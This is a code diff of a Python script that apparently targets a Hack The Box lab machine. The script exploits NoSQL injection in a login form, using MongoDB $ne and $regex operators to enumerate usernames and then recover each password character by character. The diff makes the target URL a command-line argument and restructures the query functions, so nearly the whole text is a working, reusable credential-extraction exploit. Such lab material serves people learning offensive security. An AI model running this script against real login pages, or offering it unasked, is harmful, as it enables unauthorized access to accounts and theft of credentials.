@@ -1,21 +1,35 @@
 import requests
+import argparse
 
-url = 'http://staging-order.mango.htb/'  # !!change url!!
-username = None
+
+def is_password_complete(password):
+    return is_injectable({"username": username, "password": password, "login": "login"})
+
+
+def is_username_complete(username):
+    return is_injectable({"username": username, "password[$ne]": "", "login": "login"})
 
 
 def is_complete(secret):
     if username_enumeration:
-        return is_injectable({"username": secret, "password[$ne]": "", "login": "login"})
+        return is_username_complete(secret)
     else:
-        return is_injectable({"username": username, "password": secret, "login": "login"})
+        return is_password_complete(secret)
+
+
+def get_password_querry(payload):
+    return {"username": username, "password[$regex]": "^" + payload, "login": "login"}
+
+
+def get_username_querry(payload):
+    return {"username[$regex]": "^" + payload, "password[$ne]": "", "login": "login"}
 
 
 def get_querry(payload):
     if username_enumeration:
-        return {"username[$regex]": "^" + payload, "password[$ne]": "", "login": "login"}
+        return get_username_querry(payload)
     else:
-        return {"username": username, "password[$regex]": "^" + payload, "login": "login"}
+        return get_password_querry(payload)
 
 
 def is_injectable(data):
@@ -25,39 +39,30 @@ def is_injectable(data):
 
 
 def find_next_letters(secret):
-    valid_letters = []
+    found_letters = []
     for i in range(32, 127):  # ASCII decimal - alphanum + special symbols
-        if chr(i) in "*.?^$|+":  # regex special symbols
+        if chr(i) in "*.?^$|+":  # nosql regex special symbols
             continue
         else:
             next_letter = chr(i)
 
-        if not valid_letters and not username_enumeration:
+        if not username_enumeration:
             print("\r{}:{}".format(username, secret + next_letter), flush=False, end='')
-        elif not valid_letters:
+        elif not found_letters:
             print("\r" + secret + next_letter, flush=False, end='')
 
         if is_injectable(get_querry(secret + next_letter)):
-            valid_letters.append(next_letter)
-            if not username_enumeration:  # for password is relevant just first letter occurrence
-                break
+            found_letters.append(next_letter)
 
-    return valid_letters
+        if found_letters and not username_enumeration:  # for password is relevant just first letter occurrence
+            break
 
-
-def find_password(target_username):
-    global username
-    global username_enumeration
-    username = target_username
-    username_enumeration = False
-    find_secret([])
-    username_enumeration = True
+    return found_letters
 
 
 def find_secret(found, secret=""):
     if is_complete(secret):
         found.append(secret)
-        #find_password(secret)
         print()
     else:
         for next_letter in find_next_letters(secret):
@@ -65,19 +70,16 @@ def find_secret(found, secret=""):
     return found
 
 
+parser = argparse.ArgumentParser()
+parser.add_argument("-u", default='http://staging-order.mango.htb/')
+args = parser.parse_args()
+url = args.u
+
+print("Enumerating usernames ...")
 username_enumeration = True
-# enumerate usernames
 usernames = find_secret([])
 
-# enumerate passwords
+print("Enumerating passwords ...")
 username_enumeration = False
 for username in usernames:
     find_secret([])
-
-# credentials = dict.fromkeys(usernames, "")
-# for username in credentials:
-#    credentials[username] = find_secret("")[-1]
-
-# report
-# for username in credentials:
-#   print(("{}:{}").format(username, credentials[username]))
